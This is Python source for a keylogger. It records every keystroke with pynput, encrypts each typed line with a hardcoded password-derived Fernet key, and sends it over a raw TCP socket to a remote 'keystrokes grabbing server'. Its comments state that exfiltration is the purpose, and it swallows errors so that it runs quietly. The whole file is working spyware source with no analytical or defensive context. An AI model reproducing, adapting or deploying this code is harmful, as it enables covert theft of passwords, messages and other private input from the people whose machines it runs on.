try:
    import os
    import base64
    import socket
    from time import sleep
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from pynput.keyboard import Listener,Key
except ImportError:
    pass

HOST=''
PORT=12345
PASSWORD= b"password"   # Change password you want 
message_container=[]    

try:
    # Trying to connect keystrokes grabbing server.
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((HOST,PORT))

except Exception:
    pass

def encrpt_message(message):
    # Function to encrypt the keystrokes before exfiltration.
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=1200000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(PASSWORD))
    fernet = Fernet(key)

    encrypted_message=fernet.encrypt(message.encode())
    final_message=salt + encrypted_message

    return base64.b64encode(final_message)

def on_press(key):
    # Function to get keystrokes. 
    try:
        if key == Key.space:
            pressed_key="<space>"
        elif key == Key.backspace:
            pressed_key="<backspace>"
        elif key == Key.caps_lock:
            pressed_key="<caps_lock>"
        elif key == Key.esc:
            pressed_key ="<esc>"
        elif key == Key.tab:
            pressed_key ="<tab>"
        elif key == Key.delete:
            pressed_key ="<delete>"
        elif key == Key.ctrl or key == Key.ctrl_l or key == Key.ctrl_r:
            pressed_key="<Ctrl>"
        elif key == Key.shift or key == Key.shift_l or key == Key.shift_r:
            pressed_key ="<shift>"
        elif key == Key.enter:
            message="".join(message_container)
            encrypted_content=encrpt_message(message)
            sock.sendall(encrypted_content)
            message_container.clear()
        else:
            pressed_key=key.char
        try:
            message_container.append(pressed_key)
        except Exception:
            pass

    except Exception as E:
        print(f"Exception :{E}")       

listener=Listener(on_press=on_press)
listener.start()

try:
    while listener.running:
        sleep(0.1)

except KeyboardInterrupt:
    pass